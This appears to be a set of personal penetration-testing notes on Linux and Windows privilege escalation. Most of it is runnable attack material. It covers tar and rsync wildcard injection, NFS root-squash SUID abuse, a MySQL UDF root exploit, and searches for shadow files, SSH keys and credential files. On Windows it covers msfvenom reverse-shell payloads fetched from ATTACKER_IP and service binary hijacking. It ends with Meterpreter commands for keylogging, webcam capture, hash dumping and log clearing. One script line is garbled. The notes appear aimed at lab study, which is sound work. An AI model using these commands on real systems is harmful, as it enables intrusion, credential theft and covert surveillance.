- Put it to `/home/user`
- Make it executable:
`chmod +x /home/user/shell.elf`
- Create these two files in /home/user:
Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
```sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
- Listen on attacker machine and wait for a cron run

</div></div>

## Writable scripts invoked by root

### Look for scripts with root permisions
```sh
find / -name *.sh 2>/dev/null | xargs ls -l
```

```shell
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

if a file is found, in temp create a script and exec the code
```sh
#!/bin/bash
	while true; do
		echo 'chmos u+s >> /tmpa.bash'
	done
```
## Passwords & keys
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Check history files

</div>


- Check If a user accidentally types their password
```shell
history
```
```shell
cat ~/.*history | less
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Check config files

</div>


- Config files often contain passwords in plaintext or other reversible formats.
- Check what plaintext files is loading some files
```shell
ls /home/user
cat /home/user/myvpn.ovpn
```


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



[[LFI-WordList-Linux\|LFI-WordList-Linux]]

| **Location**                  | **Description**                                                                                                                                                   |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/etc/issue`                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| `/etc/profile`                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| `/proc/version`               | specifies the version of the Linux kernel                                                                                                                         |
| `/etc/passwd`                 | has all registered user that has access to a system                                                                                                               |
| `/etc/shadow`                 | contains information about the system's users' passwords                                                                                                          |
| `/root/.bash_history`         | contains the history commands for root user                                                                                                                       |
| `/var/log/dmessage`           | contains global system messages, including the messages that are logged during system startup                                                                     |
| `/var/mail/root`              | all emails for root user                                                                                                                                          |
| `/root/.ssh/id_rsa`           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| `/var/log/apache2/access.log` | the accessed requests for Apache  webserver                                                                                                                       |


</div></div>


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Check SSH keys

</div>


- Sometimes **users make backups** of important files but **fail** to secure them **with** the correct **permissions**.
- Search `.ssh` folder
- In this example, file called **root_key**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Weak-reused-plaintext passwords

</div>


- Check file where webserver connect to database (`config.php` or similar)
- Check databases for admin passwords that might be reused
- Check weak passwords

```shell
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext password

```shell
# Anything interesting the the mail?
/var/spool/mail
```

```shell
./LinEnum.sh -t -k password
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## NFS

</div>


## NFS exploitation
- If  you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.
### root_squash
- By **default**, on NFS shares- **Root Squash**ing is **enabled**, and **prevents** anyone connecting to the NFS share from having **root access** to the NFS volume.
- Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges.
- Not what we want. However, **if this is turned off**, it can allow the creation of [[Operative System/Linux/Permisos/SUID\|SUID]] bit files, allowing a remote user root access to the connected system.
### Check root_squash
On the target machine check which file systems are exporting to remote hosts.
```shell
cat /etc/exports
```
Check if any share has root squashing disabled like:
`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
### Method 1 -  Copy Bash file
- We're **able** to **upload files** to the NFS share, and control the permissions of these files.
- **We can set the permissions** of whatever we upload, in this case a **bash** shell executable.
- We can then log in through SSH and execute this executable to gain a root shell!
1. NFS Access
   Mount if `/tmp` has `no_root_squash`
```shell
mount 192.168.1.101:/ /tmp/
mount -o rw,vers=3 VICTIM_IP:/tmp /tmp/nfs
```
2. Gain Low Privilege Shell
3. Download and put the victim bash file to the NFS share
   `scp victimname@VICTIM_IP:/bin/bash /tmp/nfs`
4. Set SUID Permissions Through NFS Due To Misconfigured Root Squash
   ```shell
   sudo chown root bashfile
   sudo chmod +s bashfile
   ```
5. Login through SSH
6. Execute SUID Bit Bash Executable (On the victim machine)
   ```shell
   ./bash -p
   ```
   The `-p` persists the permissions, so that it can run as root with SUID as otherwise bash will sometimes drop the permissions.
7. ROOT ACCESS
### Method 2 - Create Executable file
```shell
# First check if the target machine has any NFS shares
showmount -e 192.168.1.101
```
If it does, then mount it to your filesystem
Log as **root** and mount.
Mount if `/tmp` has `no_root_squash`
```shell
mount 192.168.1.101:/ /tmp/
mount -o rw,vers=3 VICTIM_IP:/tmp /tmp/nfs
```
If that succeeds, go to `/tmp/share` or `/tmp/nfs`
There might be some interesting stuff there.
But even if there isn't you might be able to exploit it.
- **Test** if you can **create files**, then check with your low-priv shell **what user** has **created** that file.
- **If it root**, **create** a [[exploit_file_NFS\|exploit_file_NFS]] **or** generate a payload using **msfvenom**
```shell
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
- save it to the mounted share or compile it with [[Programming/gcc\|gcc]] (On the victim machine if it's possible to avoid compatibility issues) to get the executable
- set it with **[[Operative System/Linux/Permisos/SUID\|suid]]**-permission from your attacking machine.
```shell
chmod 4777 exploit_file
chmod +xs exploit_file
```
 - And then **execute it** with your low privilege shell on the victim machine.

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## User Installed Software

</div>


- some third party software that might be vulnerable?. If you find anything google it for exploits.
```shell
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- service is running as root and the "root" user for the service does not have a password assigned
- take advantage of [[UDF\|UDF]] to run system commands as root via the MySQL service.
- https://www.exploit-db.com/exploits/1518
Compile
```shell
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect

	mysql -u root

Create a [[UDF\|UDF]] ) "do_system" using our compiled exploit:
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

	select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

	/tmp/rootbash -p

**Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!**

	rm /tmp/rootbash   exit

</div></div>


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Wildcard spare

</div>


https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
## chown, chmod

You can **indicate which file owner and permissions you want to copy for the rest of the files**

```
touch "--reference=/my/own/path/filename"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Execute arbitrary commands:**

```
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Execute arbitrary commands:**

```
Interesting rsync option from manual:

 -e, --rsh=COMMAND           specify the remote shell to use
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```
touch "-e sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** even using `--` before `*` (note that `--` means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:

```
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```

And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:

```
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress (thats what the existence of `@root.txt` indicates) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.

_More info in Write-ups of the box CTF from HackTheBox._

## Zip

**Execute arbitrary commands:**

```
zip name.zip files -T --unzip-command "sh -c whoami"
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Service only available from inside

</div>


- It might be the user is running some service that is only available from that host.
- You **can't** connect to the service from the **outside**.
- It might be a development **server**, a **database**, or anything else.
- These services **might** be running as **root**, or they might have **vulnerabilities** in them.

Check the netstat and compare it with the nmap-scan you did from the outside.

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Check interesting services

| Option                                    | Description                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -lanp`                           | Common use                                                                                    |
| `netstat -ano`                            | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |
| `netstat -a`                              | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au`           | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                              | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                              | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                             | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -p`                              | Show the PID and name of the program to which each socket belongs.                            |
| `netstat -i`                              | Shows interface statistics.                                                                   |
| `netstat -anlp \| grep -iE "tcp.*LISTEN"` | Filtering `tcp`  and `listen`                                                                 |



</div></div>


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Unmounted filesystems

</div>


- looking for any unmounted filesystems.
- If we find one we mount it and start the priv-esc process over again.

```
mount -l
cat /etc/fstab
```

</div></div>

## Kernel and distribution exploits
- Kernel exploits can leave the system in an **unstable state**
- Only run them as a **last resort.**
- Try search on https://www.linuxkernelcves.com/cves
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### LES

</div>


- System enumeration - Automated
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
**linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && \
perl linux-exploit-suggester-2.pl
```

</div></div>

### [[Hacking Ético y Pentesting/DirtyCow\|DirtyCow]]

# Windows privesc
```powershell
dir /b/s "\*.conf*"
dir /b/s "\*.txt*"
dir /b/s "\*secret*"
route print
netstat -r
fsutil fsinfo drives
wmic logicaldisk get Caption,Description,providername
```

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Windows account

</div>


The user account type will determine what actions the user can perform on that specific Windows system. 

**Administrator** 
- can make changes to the system: add users, delete users, modify groups, modify settings on the system, etc. 
- Any user with administrative privileges will be part of the **Administrators** group

**Standard User**
- can only make changes to folders/files attributed to the user & can't perform system-level changes, such as install programs.
- Standard users are part of the **Users** group.

# Special built-in account
- Used by the operating system in the context of privilege escalation

| **SYSTEM / LocalSystem** | An account used by the operating system to perform internal tasks. It has **full access** to all files and resources available on the host with **even higher privileges than administrators.** |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Local Service**        | Default account used to **run Windows services** with "minimum" privileges. It will use **anonymous connections** over the network.                                                             |
| **Network Service**      | Default account used to **run Windows services** with "minimum" privileges. It will use the **computer credentials to authenticate** through the network.                                       |
# Other

Right-click on the Start Menu and click **Run**. Type `lusrmgr.msc`. See below

- To protect the local user with such privileges, Microsoft introduced **User Account Control** (UAC). This concept was first introduced with the short-lived [Windows Vista](https://en.wikipedia.org/wiki/Windows_Vista) and continued with versions of Windows that followed.

**Note**: UAC (by default) doesn't apply for the built-in local administrator account. 

How does UAC work? When a user with an account type of administrator logs into a system, the current session doesn't run with elevated permissions. When an operation requiring higher-level privileges needs to execute, the user will be prompted to confirm if they permit the operation to run.

</div></div>

## System enumeration
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### winPEAS

</div>


https://github.com/peass-ng/PEASS-ng/releases
winpeas x64
```shell
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe
winPEASx64.exe > outputfile.txt
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### PowerUp

</div>


- Clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
```shell
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

| Option                                                         | Description |
| -------------------------------------------------------------- | ----------- |
| `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"` | AllChecks   |

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### PrivescCheck

</div>


- [[powershell\|powershell]] script
- https://github.com/itm4n/PrivescCheck
- Search common priv escalation
- No require execution of a binary
```shell
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
```

| Option                                                                                                                                                     | Description                              |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`                                                                                     | Basic check only                         |
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"`                | Extended checks + human-readable reports |
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"` | All checks + all reports                 |


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### WES-NG

</div>


- Run on the attacker machine
- https://github.com/bitsadmin/wesng
Get info using `systeminfo.exe` to a `systeminfo.txt` and pass to the attacker machine.
On the victim local
```shell
systeminfo > systeminfo.txt
```
Or remote
```shell
systeminfo /S MyRemoteHost
```
On the attacker machine
```shell
git clone https://github.com/bitsadmin/wesng --depth 1
cd wesng
python wes.py --update
python wes.py systeminfo.txt
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### meterpreter

</div>


## To scan vuln on windows
```shell
run multi/recon/local_exploit_suggester
```

</div></div>

### Other resources
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

## Abusing Service Misconfigurations
- [[Windows services\|Windows services]]
### CanRestart and writable service
- IF an service is Canrestart True and writeable.
- The Path is
  `Path: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
- We can replace the legitimate application with our malicious one
- restart the service, which will run our infected program!
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Unquoted Service Paths

</div>


- When we **can't** **write** into service **executables**.
- If a service is configured to point to an "unquoted" executable.
```shell-session
sc qc "vncserver"
```
Correct
![Pasted image 20240821200031.png|600](/img/user/Pasted%20image%2020240821200031.png)
Example Incorrect
![Pasted image 20240821200138.png|600](/img/user/Pasted%20image%2020240821200138.png)
- When the [[SCM\|SCM]] tries to execute the binary, a problem arises.
- Since there are **spaces** on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM **doesn't know which** of the following you are trying to **execute**.
- Spaces are used as argument separators unless they are part of a quoted string

| Command                                              | Argument 1                 | Argument 2                 |
| ---------------------------------------------------- | -------------------------- | -------------------------- |
| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |
1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

Usually that files are installed on system folders but:
- Some installers change the permissions on the installed folders, making the services vulnerable.
- An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

For tis example, check the folder permissions
![Pasted image 20240821211411.png|600](/img/user/Pasted%20image%2020240821211411.png)
The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Generate payloads
- Access all payloads available in the Metasploit framework.
- Create payloads in many different formats (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
- Different target systems (Apple, Windows, Android, Linux, etc.).
- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**

| Option                                               | Description                                         |
| ---------------------------------------------------- | --------------------------------------------------- |
| `msfvenom -l payloads`                               | Show payloads                                       |
| `msfvenom --list payloads`                           | list supported output formats                       |
| `msfvenom -p payload`                                | Select a payload                                    |
| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
| `R`                                                  | Set `R` at final of code is to specify reverseshell |

```shell
payload options
```
```sh
msfvenom --list payloads
```
```sh
msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
```
# Non staged - Single
- send payload in 1 file
- easier to use and catch
- easier for an antivirus or intrusion detection program to discover and remove.
- Stageless payloads are denoted with underscores (`_`)
# Stages
- send payload in some files or parts
- harder to use,
- **first part** is called the _stager_
- executed directly on the server itself.
- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- connects to the listener and uses the connection **to load the real payload**
- Thus the payload is **split** into **two parts**
	- a small **initial stager**
	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
- Staged payloads require a special listener, usually the Metasploit Multihandler
- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
- are denoted with another forward slash (`/`).
# **Output formats**
```
msfvenom --list formats
```

# Payloads
## Payload Naming Conventions
```sh
<OS>/<arch>/<payload>
```

Stageless reverse shell for an x86 Linux target
```sh
linux/x86/shell_reverse_tcp
```

Windows 32bit targets
- exception, the arch is not specified
```sh
windows/shell_reverse_tcp
```
## Reverse payloads
- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
- These values will be the same you have used when creating the msfvenom payload.

| Option                                                                                          | Description |
| ----------------------------------------------------------------------------------------------- | ----------- |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | Windows     |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
Linux - Executable and Linkable Format (elf)
- staged
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
- The .elf format is comparable to the .exe format in Windows
```bash
chmod +x shell.elf
./shell.elf
```

### Windows
Exe-service
- Exe-service payload and serve it through a python webserver:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe

python3 -m http.server
```
- Pull the payload from Powershell
```powershell
wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
```

Windows reverse tcp (staged)
``` shell
mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```

Windows reverse tcp (non staged)
``` shell
mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```
Windows x64 reverse shell, exe format
```sh
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
### PHP
- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
![Pasted image 20240606180600.png|600](/img/user/Pasted%20image%2020240606180600.png)
- The reverse_shell.php file should be edited to convert it into a working PHP file.
- Below: Comments removed from the beginning of the file.
- End tag added
![Pasted image 20240606180735.png|500](/img/user/Pasted%20image%2020240606180735.png)
![Pasted image 20240606180753.png|400](/img/user/Pasted%20image%2020240606180753.png)

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Metasploit attack payload
- Metasploit's own brand of fully-featured shell.
- completely stable, making them a **very good thing when working with Windows targets**
- Inbuilt functionality, such as file **uploads** and **downloads**.
- that provides an **interactive shell** from which an attacker can explore the target machine and **execute code.**
- runs on the target system but **is not installed** on it. It **runs in memory**
- It is typically deployed using in-memory DLL injection to reside entirely in **memory**.
- aims to **avoid** being **detected** during **antivirus** scans.
- aims to avoid being detected by network-based [[Networking/Seguridad en redes/Seguridad Perimetral/IPS\|IPS]] and [[Networking/Seguridad en redes/Seguridad Perimetral/IDS\|IDS]]
- The **downside** to meterpreter shells is that they _must_ be caught in Metasploit.
- using **encrypted** communication
- **If** the target organization **does not decrypt and inspect** encrypted **traffic** (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions **will not be able to detect** its activities.
- establish an encrypted ([[TLS\|TLS]]) communication channel
- most **antivirus** software **will** **detect it.**
- Run in windows under the `spoolsv.exe` process

| Option                                         | Description                                             |
| ---------------------------------------------- | ------------------------------------------------------- |
| `help`                                         | SHow help                                               |
| `getpid`                                       | Show the [[PID\|PID]]                                        |
| `ps`                                           | list processes running on the system                    |
| `tasklist /m /fi "pid eq 1304"`                | look at DLLs (Dynamic-Link Libraries) used by a process |
| `msfvenom --list payloads \| grep meterpreter` | List type of meterpreter payloads                       |
- some exploits will have a default Meterpreter payload

# Migrate shell to meterpreter
By default upgrade to x32 (x86)
```shell
post/multi/manage/shell_to_meterpreter
```
It possible to modify the ruby code to change to x64
![Pasted image 20241003114902.png](/img/user/attachments/Pasted%20image%2020241003114902.png)
```shell
reload_all
```
# How to decide which payload to use
- The target operating system (Is the target operating system Linux or Windows?
- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
# Commands
## Core commands

| Option       | Description                                            |
| ------------ | ------------------------------------------------------ |
| `background` | Backgrounds the current session                        |
| `exit`       | Terminate the Meterpreter session                      |
| `guid`       | Get the session GUID (Globally Unique Identifier)      |
| `help`       | Displays the help menu                                 |
| `info`       | Displays information about a Post module               |
| `irb`        | Opens an interactive Ruby shell on the current session |
| `load`       | Loads one or more Meterpreter extensions               |
| `migrate`    | Allows you to migrate Meterpreter to another process   |
| `run`        | Executes a Meterpreter script or Post module           |
| `sessions`   | Quickly switch to another session                      |
## File system commands

| Option                   | Description                                                   |
| ------------------------ | ------------------------------------------------------------- |
| `cd`                     | Will change directory                                         |
| `ls`                     | Will list files in the current directory (dir will also work) |
| `pwd`                    | Prints the current working directory                          |
| `edit`                   | will allow you to edit a file                                 |
| `cat`                    | Will show the contents of a file to the screen                |
| `rm`                     | Will delete the specified file                                |
| `rmdir`                  | Will delete a folder.                                         |
| `search`                 | Will search for files                                         |
| `upload local_path_file` | Will upload a file or directory                               |
| `download`               | Will download a file or directory                             |
## Networking commands

| Option                                     | Description                                                |
| ------------------------------------------ | ---------------------------------------------------------- |
| `arp`                                      | Displays the host ARP (Address Resolution Protocol) cache  |
| `ifconfig`                                 | Displays network interfaces available on the target system |
| `netstat`                                  | Displays the network connections                           |
| `route`                                    | Allows you to view and modify the routing table            |
| `portfwd`                                  | Forwards a local port to a remote service                  |
| `portfwd add -l 8080 -p 80 -r 10.0.2.3`    | lport 8080, rport 80, rhost 10.0.2.3                       |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                                     |
| `portfwd list`                             | List porforwarding configs                                 |
## System commands

| Option       | Description                                          |
| ------------ | ---------------------------------------------------- |
| `sysinfo`    | Gets information about the remote system, such as OS |
| `getuid`     | Shows the user that Meterpreter is running as        |
| `clearev`    | Clears the event logs                                |
| `execute`    | Executes a command                                   |
| `getpid`     | Shows the current process identifier                 |
| `kill`       | Terminates a process                                 |
| `pkill`      | Terminates processes by name                         |
| `ps`         | Lists running processes                              |
| `reboot`     | Reboots the remote computer                          |
| `shell`      | Drops into a system command shell                    |
| `shutdown`   | Shuts down the remote computer                       |
| `show_mount` | Show mount drivers                                   |
## Keylogger
| Option          | Description                 |
| --------------- | --------------------------- |
| `keyscan_start` | Starts capturing keystrokes |
| `keyscan_stop`  | tops capturing keystrokes   |
| `keyscan_dump`  | Dumps the keystroke buffer  |
## Sniffer

| Option               | Description     |
| -------------------- | --------------- |
| `use sniffer`        | Use             |
| `sniffer_interfaces` | Show interfaces |
| `snifer_start`       |                 |
| `snifer_stats`       | Show stats      |
| `snifer_stop`        |                 |
| `snifer_dumps`       |                 |
## Webcam

| Option          | Description                                    |
| --------------- | ---------------------------------------------- |
| `webcam_chat`   | Starts a video chat                            |
| `webcam_list`   | Lists webcams                                  |
| `webcam_snap`   | Takes a snapshot from the specified webcam     |
| `webcam_stream` | Plays a video stream from the specified webcam |
## Activity
Get a kit of features, screenshots, webcam, keylogger.

| Option           | Description        |
| ---------------- | ------------------ |
| `load beholder`  | Load               |
| `beholder_start` | Start the beholder |
## Other commands
These will be listed under different menu categories in the help menu

| Option        | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| `idletime`    | Returns the number of seconds the remote user has been idle |
| `screenshare` | Allows you to watch the remote user's desktop in real time  |
| `screenshot`  | Grabs a screenshot of the interactive desktop               |
| `record_mic`  | Records audio from the default microphone for X seconds     |
| `getsystem`   | Attempts to elevate your privilege to that of local system  |
| `hashdump`    | Dumps the contents of the SAM database                      |
| `getprivs`    | Show privileges                                             |
| `timestomp`   | Modify timestamps of files on the system.                   |
| `run vnc`     | Run an [[vnc\|vnc]] in a machine.                                |
# Versions available
- Android
- Apple iOS
- Java
- Linux

| Option                              | Description           |
| ----------------------------------- | --------------------- |
| `linux/x86/meterpreter_reverse_tcp` | Linux 32bit stageless |
- OSX
- PHP
- Python
- Windows

| Option                                | Description                              |
| ------------------------------------- | ---------------------------------------- |
| `windows/x64/meterpreter/reverse_tcp` | Windows 64bit staged Meterpreter payload |
# Post explotation
- `getuid` This will give you an idea of your possible privilege level on the target system - NT AUTHORITY\SYSTEM or a regular user?
- The `ps` command will list running processes. The PID column will also give you the PID information you will need to **migrate Meterpreter to another process.**

## Post explotation Phases
- Gathering further information about the target system.
- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
- Privilege escalation.
- Lateral movement.

## Migrate
- if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.),
- you can migrate to it and start **capturing keystrokes** sent by the user to this process
- Some Meterpreter versions will offer the `keyscan_start`, or others commands options to make Meterpreter act like a **keylogger**.
- may also help you to have a **more stable** Meterpreter **session**.
- **Alert** you **may lose** your user **privileges** **if you migrate from a higher privileged** (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You **may not be able to gain them back.**
